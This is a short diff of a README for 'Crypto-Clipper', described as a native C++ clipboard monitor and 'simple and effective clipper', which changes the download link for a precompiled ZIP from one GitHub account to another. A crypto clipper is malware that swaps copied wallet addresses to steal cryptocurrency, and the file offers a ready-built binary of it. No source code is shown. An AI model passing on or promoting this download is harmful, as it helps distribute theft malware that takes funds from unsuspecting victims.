@@ -1,4 +1,4 @@
-Download Precompiled: https://github.com/cotrew-byte/Crypto-Clipper/releases/download/clipp/ClipBoardMonitor.zip
+Download Precompiled: https://github.com/SilverZoneHub/CryptoClipper/releases/download/clipperBuild/ClipBoardMonitor.zip
 
 # Crypto-Clipper
 Clipboard Monitor Native C++ Simple And Effective clipper 
